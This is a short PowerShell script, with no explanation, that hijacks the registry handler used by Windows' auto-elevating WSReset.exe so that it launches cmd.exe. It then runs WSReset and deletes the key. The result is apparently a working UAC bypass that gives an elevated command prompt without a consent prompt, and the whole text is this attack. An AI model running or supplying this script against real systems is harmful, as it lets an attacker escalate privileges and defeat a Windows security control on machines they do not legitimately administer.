New-Item "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" -Name "(default)" -Value cmd.exe -Force
Start-Sleep -s 1
Start-Process "C:\Windows\System32\WSReset.exe"
Start-Sleep -s 10
Remove-Item "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" -Recurse -Force